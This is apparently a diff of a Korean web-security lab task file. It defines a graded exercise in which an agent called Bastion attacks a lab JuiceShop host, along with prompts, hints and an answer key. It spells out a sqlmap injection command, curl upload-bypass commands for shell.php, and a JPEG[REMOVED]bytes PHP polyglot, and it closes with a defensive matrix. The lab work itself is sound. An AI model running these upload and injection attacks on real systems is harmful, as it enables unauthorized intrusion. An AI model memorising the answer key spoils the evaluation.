@@ -238,7 +238,9 @@ steps:
   answer_detail: 이미지 파일 내 코드 삽입은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
   verify:
     type: output_contains
-    expect: 완료
+    expect:
+    - 완료
+    - exiftool
     field: stdout
     semantic:
       intent: 이미지에 코드 주입 — exiftool 로 EXIF Comment 에 PHP 코드 삽입 또는 파일 끝에 코드 append
@@ -388,7 +390,9 @@ steps:
   answer_detail: 파일 크기 제한 테스트은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
   verify:
     type: output_contains
-    expect: 완료
+    expect:
+    - 완료
+    - '413'
     field: stdout
     semantic:
       intent: 파일 크기 제한 테스트 — 대용량 파일 업로드로 서버 검증·DoS 가능성 평가
@@ -542,53 +546,104 @@ steps:
   risk_level: low
   bastion_prompt: 파일 업로드 취약점 실습 종합 보고서를 작성하시오.
 - order: 99
-  instruction: '[Multi-task] 이번 주 핵심 작업 5개를 한 번에 수행하라.'
-  bastion_prompt: '다음 작업들을 순서대로 수행해줘:
+  instruction: |
+    [복합 시나리오] "input validation 실패 비교 — SQLi (컬럼 입력) vs Upload (파일/MIME)"
 
-    1) 10.20.30.80 대상으로 업로드 기능 식별을(를) 수행해줘
+    ## 상황 (w04 → w05 시나리오 연속)
 
-    2) 10.20.30.80 대상으로 허용 파일 유형 확인을(를) 수행해줘
+    w04 에서 인증·세션 매트릭스까지 마쳤다. 이번 주는 입력값 검증.
 
-    3) 10.20.30.80 대상으로 확장자 필터 우회(이중 확장자)을(를) 수행해줘
+    > 선배: "SQLi 랑 파일 업로드는 다른 취약점처럼 보이지만 같은 실패야 — 입력값 검증 누락.
+    > SQLi 는 컬럼 값을 그대로 쿼리에 박은 거고, 업로드는 파일명·MIME 을 그대로 믿은 거지.
+    > 두 취약점 동시 점검해서 '입력 위치 × validation 종류' 매트릭스 만들어. 공통 방어 원칙도 정리하고."
 
-    4) 10.20.30.80 대상으로 Content-Type 변조 업로드을(를) 수행해줘
+    학습 목표 (lecture #2 SQLi 유형 + #4 sqlmap) + (lab #3 확장자 + #4 Content-Type + #5 Magic bytes) 통합.
 
-    5) 10.20.30.80 대상으로 매직 바이트 조작 업로드을(를) 수행해줘'
-  hint: 복합 작업은 Bastion이 순서대로 계획하고 실행해야 한다
-  category: multi_task
+    ## 임무 (3 단계, 약 35분)
+
+    ### Phase A — SQLi validation 실패 (lecture #2·#3·#4)
+    `sqlmap -u "http://10.20.30.80/rest/products/search?q=test" --batch --technique=BT --level=2` 로
+    Boolean·Time-based 자동 탐지. response time 차이 (>5초) 가 Time-based 증거. sqlmap 출력의
+    "[INFO] heuristic ... appears to be vulnerable" 라인 캡처.
+
+    ### Phase B — Upload validation 실패 3 케이스 (lab #3·#4·#5)
+    JuiceShop 의 `/api/Complaints/` 또는 `/file-upload` 대상 (실제 환경이 다르면 가상 URL 로 대체).
+    - 확장자 우회: shell.php.jpg / shell.pHp / shell.php%00.jpg 3개 파일명 시도
+    - Content-Type 변조: `curl -F "file=@shell.php;type=image/jpeg"` 헤더 위조
+    - Magic bytes: `printf '\xff\xd8\xff\xe0<?php phpinfo(); ?>' > shell.php` JPEG header + PHP code
+
+    ### Phase C — "입력 위치 × validation 종류" 매트릭스 + 공통 원칙
+    | 입력 위치 | 위반 종류 | 자동 검증 | 권장 방어 |
+    | URL/Body 컬럼 | SQLi (1=1, ' OR) | Prepared Statement | parameterized query |
+    | 파일명 | 확장자 우회 | basename 분리 | extension allowlist |
+    | Content-Type 헤더 | MIME 위조 | mime_content_type() | server-side detect |
+    | 파일 내용 | Magic bytes 우회 | finfo + scan | sandbox + AV |
+    표 끝에 "공통 원칙: allowlist > blocklist + 다층 검증 + 신뢰 경계 명확화" 한 줄.
+
+    종료: echo "=== Phase A SQLi ===" / "=== Phase B Upload 3 케이스 ===" / "=== Phase C 매트릭스 ===" 묶음.
+  bastion_prompt: |
+    [복합 시나리오 — w05 input validation 비교]
+
+    SQLi 와 파일 업로드 두 취약점을 같은 "input validation 실패" 관점에서 점검. 3 phase.
+
+    Phase A (SQLi):
+    `sqlmap -u "http://10.20.30.80/rest/products/search?q=test" --batch --technique=BT --level=2 --timeout=20`
+    실행. Boolean·Time-based 결과 + "[INFO] ... appears to be vulnerable" 라인 캡처.
+
+    Phase B (Upload 3 케이스):
+    실제 업로드 엔드포인트가 정확하지 않으면 *PoC 명령어만 출력* 해도 OK.
+    - 확장자: `for ext in php.jpg pHp 'php%00.jpg'; do curl -F "file=@/tmp/shell.$ext" http://10.20.30.80/api/Complaints/file; done`
+    - Content-Type: `curl -F "file=@/tmp/shell.php;type=image/jpeg" http://10.20.30.80/api/Complaints/file`
+    - Magic bytes: `printf '\xff\xd8\xff\xe0<?php phpinfo(); ?>' > /tmp/shell.php` 후 위 curl
+
+    Phase C (매트릭스):
+    ```
+    | 입력 위치 | 위반 종류 | 자동 검증 | 권장 방어 |
+    | URL/Body 컬럼 | SQLi (1=1, ' OR) | Prepared Statement | parameterized query |
+    | 파일명 | 확장자 우회 | basename 분리 | extension allowlist |
+    | Content-Type 헤더 | MIME 위조 | mime_content_type() | server-side detect |
+    | 파일 내용 | Magic bytes 우회 | finfo + scan | sandbox + AV |
+    ```
+    표 끝에 "공통 원칙: allowlist > blocklist + 다층 검증 + 신뢰 경계 명확화" 한 줄.
+
+    종료: echo 묶음 "=== Phase A SQLi ===" / "=== Phase B Upload ===" / "=== Phase C 매트릭스 ===".
+
+    반드시 3 phase 모두 실행. 중간 종료 금지.
+  hint: |
+    Phase A: --technique=BT 가 Boolean+Time. --timeout 20초 정도 권장.
+    Phase B: 업로드 엔드포인트가 환경마다 다름. 명령어만 출력해도 OK.
+    Phase C: 4행 매트릭스. 공통 원칙 한 줄.
+    포인트: SQLi 와 업로드는 *같은 원리* — 입력값을 그대로 믿는 실패.
+  category: integration_scenario
   points: 50
   verify:
     type: output_contains
-    expect: ''
+    expect: 매트릭스
     field: stdout
     semantic:
-      intent: '[통합] 파일 업로드 5작업 — bypass extension/MIME/content/shell/audit 통합. T1190
-        + webshell.'
+      intent: |
+        SQLi 와 파일 업로드를 "input validation 실패" 동일 관점에서 점검 + 입력 위치 × validation 매트릭스.
+        lecture #2·#3·#4 + lab #3·#4·#5 동시 행동 증명.
       success_criteria:
-      - 5 업로드 작업
-      - webshell
-      - RCE
+      - Phase A — sqlmap Boolean·Time-based 탐지, vulnerable 라인 캡처
+      - Phase B — 확장자 / Content-Type / Magic bytes 3 우회 시도 (또는 PoC 명령어)
+      - Phase C — 4행 매트릭스 + 공통 원칙 한 줄
       acceptable_methods:
-      - bastion plan
-      - Burp + manual
-      - polyglot
+      - sqlmap --technique=BT
+      - curl -F 로 업로드 우회
+      - printf magic bytes 생성
+      - markdown table 매트릭스
+      - 실 업로드 실패 시 PoC 명령어 출력 대체
       negative_signs:
-      - webshell 실패
-      - RCE 없음
-      - audit 누락
+      - SQLi 만 또는 업로드 만 단발 점검
+      - 매트릭스 누락
+      - 공통 원칙 누락
+      - allowlist 권고 누락
   target_vm: attacker
   risk_level: low
-  answer: '🤖 프롬프트: 다음 작업들을 순서대로 수행해줘:
-
-    1) 10.20.30.80 대상으로 업로드 기능 식별을(를) 수행해줘
-
-    2) 10.20.30.80 대상으로 허용 파일 유형 확인을(를) 수행해줘
-
-    3) 10.20.30.80 대상으로 확장자 필터 우회(이중 확장자)을(를) 수행해줘
-
-    4) 10.20.30.80 대상으로 Content-Type 변조 업로드을(를) 수행해줘
-
-    5) 10.20.30.80 대상으로 매직 바이트 조작 업로드을(를) 수행해줘'
-  answer_detail: Bastion이 5개 작업을 순차적으로 계획(planning)하고 실행(executing)한 뒤 종합 분석(validating)하는
-    다단계 작업.
+  answer: |
+    🤖 위 bastion_prompt 그대로. sqlmap → curl 업로드 PoC → 매트릭스.
+  answer_detail: |
+    SQLi 와 업로드는 표면이 다르지만 모두 "입력값을 그대로 믿음" 실패. allowlist > blocklist 가 공통 원칙.
+    Magic bytes 는 JPEG (\\xff\\xd8\\xff\\xe0) + PHP 코드 결합 PoC. 실제 업로드 환경이 변동이면 명령어 출력.
   script: ''
